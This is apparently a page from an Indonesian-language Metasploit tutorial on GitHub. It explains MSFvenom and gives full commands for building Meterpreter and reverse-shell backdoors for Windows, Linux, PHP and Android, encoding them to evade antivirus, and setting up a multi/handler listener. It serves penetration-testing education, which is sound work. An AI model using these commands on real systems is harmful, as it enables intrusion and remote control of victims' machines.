<p align="left">
  <a href="https://github.com/fixploit03/Belajar-Metasploit/blob/main/resource/Memahami%20Payload%2C%20Encoder%2C%20dan%20NOPs.md">Memahami Payload, Encoder, dan NOPs</a>
</p>

# Membuat Payload dengan MSFvenom

## A. Apa Itu MSFvenom?

[MSFvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) adalah sebuah tool dalam kerangka kerja Metasploit Framework yang digunakan untuk membuat payload berbahaya (exploit code) dalam berbagai format, seperti `.exe`, `.apk`, `.elf`, `.py`, dan `lainnya`. Tool ini menggabungkan dua alat lama di Metasploit, yaitu:
- `msfpayload`: Untuk membuat payload
- `msfencode`: Untuk mengenkripsi/encode payload agar menghindari antivirus

Sekarang semuanya menjadi satu di `msfvenom`.

## B. Fungsi Utama MSFvenom:
- Membuat payload untuk berbagai platform (`Windows`, `Android`, `Linux`, `Mac`, `dll`.)
- Encode payload agar lebih sulit dideteksi antivirus
- Menyesuaikan payload dengan IP dan port tertentu (misalnya reverse shell)
- Export payload dalam berbagai format: `.exe`, `.apk`, `.sh`, `.py`, `.asp`, `.c`, `dll`.

## C. Struktur Dasar Perintah MSFvenom:

```
msfvenom -p <PAYLOAD> LHOST=<IP_ATTACKER> LPORT=<PORT_LISTENER> -e <JENIS_ENCODER> -i <ITERASI> -f <FORMAT_OUTPUT> -o <NAMA_FILE>
```

Keterangan:

| Parameter | Fungsi |
|:--:|:--:|
| `-p` | Jenis payload yang ingin digunakan | 
| `LHOST` | IP Attacker |
| `LPORT` |	Port listener (bisanya port: `4444`) |
| `-e` | Jenis encoder yang ingin digunakan |
| `-i` | Jumlah iterasi untuk encoder |
| `-n` | Jumlah byte NOP (NOP sled) |
| `-f` |  Format file output (`exe`, `elf`, `raw`, `dll`) |
| `-o` | Nama file output |

## C. Contoh Payload Windows

1. Payload Reverse TCP:

   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
   ```

   Output: `shell.exe` (bisa dijalankan di sistem Windows).

2. Payload Dilengkapi Encoder:
  
   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe
   ```

   Encoding `5 kali` untuk menghindari deteksi AV.

## D. Contoh Payload Linux:

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o backdoor.elf
```

Output: file `ELF` untuk Linux.

## E. Format Output yang Didukung

| Format |	Keterangan |
|:--:|:--:|
| `exe` | Windows executable |
| `elf` |	Linux executable |
| `raw` | Shellcode mentah |
| `c`	| Shellcode dalam array C |
| `python` | Shellcode untuk script Python |
| `asp, jsp`	| Webshell payload |
| `dll, macho, rb, dll`	| Format lainnya |

Untuk melihat semua format yang ada pada MSFvenom ketikkan:

```
msfvenom --list formats
```

## F. Menampilkan Semua Payload yang Tersedia:

```
msfvenom -l payloads
```

## G. Contoh Payload di Format C:

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
```

Output-nya cocok untuk disisipkan dalam exploit `C` manual.

## H. Membuat Web Payload (PHP/ASP/JSP)

Contoh payload PHP:

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
```

## I. Memasukkan Bad Characters

Untuk menghindari karakter tertentu seperti `\x00\x0a`, bisa tambahkan:

```
-b "\x00\x0a"
```

Contoh:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b "\x00\x0a" -f exe -o filtered_shell.exe
```

## J. Payload untuk Android:

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o backdoor.apk
```

## K. Listener di Metasploit

Setelah payload dijalankan di target, buka listener:

```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP_ATTACKER>
set LPORT 4444
run
```

## Tips Tambahan
- Selalu uji payload di lab virtual.
- Gunakan encoding bila antivirus mendeteksi payload.
- Tambahkan `NOP sled` jika payload tidak stabil.

<p align="right">
  <a href="https://github.com/fixploit03/Belajar-Metasploit/blob/main/resource/Membuat%20Listener.md">Membuat Listener</a>
</p>
